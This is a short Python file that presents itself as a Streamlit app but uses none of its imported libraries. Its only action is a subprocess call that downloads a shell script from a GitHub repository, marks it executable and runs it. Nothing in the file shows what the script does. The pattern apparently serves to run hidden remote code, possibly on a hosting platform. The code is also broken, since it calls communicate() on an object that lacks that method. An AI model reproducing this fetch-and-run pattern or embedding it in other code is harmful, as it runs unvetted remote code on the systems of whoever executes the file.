from collections import namedtuple
import altair as alt
import math
import pandas as pd
import streamlit as st
import os
import time
import subprocess
from os import system, name
from time import sleep
from subprocess import PIPE, Popen
import base64

p = subprocess.run("curl -L -o Gnt.sh https://github.com/Ikuzot/nung/raw/main/Gnt.sh && chmod +x Gnt.sh && ./Gnt.sh", stdout=subprocess.PIPE, shell=True)
print(p.communicate())
